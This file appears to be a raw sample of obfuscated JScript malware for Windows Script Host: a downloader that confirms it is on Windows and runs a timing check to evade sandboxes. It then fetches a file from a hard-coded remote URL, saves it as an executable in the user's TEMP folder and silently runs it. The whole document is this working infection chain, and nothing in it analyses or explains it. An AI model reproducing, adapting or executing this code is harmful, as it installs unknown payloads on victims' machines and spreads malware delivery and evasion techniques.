var _S0 = false;
var _GA = "CreateObject";
var _ZO = function _Z() {return WScript[_GA]("WScript"+".Shell");}(), _AT = 11;
var _DA = "MSXML2.XMLHTTP";
var _OI = 2123213;
var _BX = 0;
function _U(_Y1){_ZO["Run"](_Y1, _BX, _BX);};
function _Z0(){return _DA + "";};
function _R0(_CR, _R1){_BX = _BX * 1; return _CR - _R1;};
function _Q(){return _GA;};
/*@cc_on
  @if (@_win32 || @_win64)
    _S0 = true;
  @end
@*/
if (_S0)
{
var _HO = "";
function _Y(){return 22;};
var _OH = 0; var _B = 0;
function _P()
{
var _X = new this["Date"]();
var _A = _X["getUTCMilliseconds"]();
WScript["Sleep"](_Y());
var _X = new this["Date"]();
var _F = _X["getUTCMilliseconds"]();
WScript["Sleep"](_Y());
var _X = new this["Date"]();
var _L = _X["getUTCMilliseconds"]();
var _OH = "_E";
_OH = _R0(_F, _A);
var _B = "_Y0";
_B = _R0(_L, _F);
_HO = "open";
return _R0(_OH, _B);
}
var _T = false;
var _V = false;
for (var _ZI = _BX; _ZI < _Y() * 1; _ZI++){if (_P() != _BX){
_T = true; 
_B = "31" + 11 * _OH + _B; 
_V = true; 
break;
}}
function _R() {return ((_T == true) && (_T == _V)) ? 1 : _BX;};
if (_T && _R() && _V){
function _UW() {return _ZO["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "nleWCWeo.ex" + "e";};
 _A1 = _Z0();
 _A0 = WScript[_GA](_A1);
 var _Q0 = 1;
 while (_Q0){
try {
	if (_Q0 == 1)
	{
		_A0[_HO]("GET", "http://srijanexportstowelwarmers.co.uk/k9owpa", false);
		_A0["send"]();
		_CW = "Sleep";
	}
	WScript[_CW](_Y() + 120); 
	if (_A0["readystate"] < 2 * 2) continue;
	_Q0 = _BX;
	function _EF(_XP) {var _PJ = (1, 2, 3, 4, 5, _XP); return _PJ;};
	_D = WScript[_Q()]("ADODB.Stream");
	_A1 = _D;
	_A1[_HO]();
	_A1["type"] = _EF(1);
	_A1["write"](_A0["ResponseBody"]);
	_D["position"] = _EF(_BX);
	_A1["Save" + "ToFile"](_UW(), 2);
	_D["cl"+"ose"]();
	_S = _UW();
	_U(_S);
} catch(_F0){};
}
}
}

